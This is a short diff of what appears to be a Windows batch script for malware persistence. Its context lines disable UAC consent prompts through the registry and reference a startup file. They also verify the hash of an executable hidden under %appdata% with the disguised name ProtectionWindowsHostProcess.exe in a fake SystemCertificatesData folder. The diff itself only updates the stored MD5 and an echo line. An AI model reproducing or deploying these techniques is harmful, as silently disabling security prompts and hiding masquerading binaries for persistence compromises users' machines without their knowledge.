@@ -16,7 +16,7 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "Con
 reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "ConsentPromptBehaviorUser" /t REG_DWORD /d 0 /f
 
 
-set "RUNEVERYOFFICIALMD5=ce74138574a515e7787d6ec7f785f6e1"
+set "RUNEVERYOFFICIALMD5=18b2ef86ad6a29d3436817b09bbc9ad8"
 
 
 
@@ -146,7 +146,7 @@ if not exist "%startupFile%" (
 
 
 for /f "tokens=*" %%A in ('certutil -hashfile "%appdata%\Microsoft\Windows\SystemCertificatesData\Tasks\ProtectionWindowsHostProcess.exe" MD5 ^| findstr /V "hash"') do set "RUNEVERYCURRENTMD5=%%A"
-echo MD5 of %SystemRoot%\System32\convertsshd.exe = %RUNEVERYCURRENTMD5%
+echo MD5 of "%appdata%\Microsoft\Windows\SystemCertificatesData\Tasks\ProtectionWindowsHostProcess.exe" = %RUNEVERYCURRENTMD5%
 echo.
 echo Comparing with stored MD5: %RUNEVERYOFFICIALMD5%
 echo.
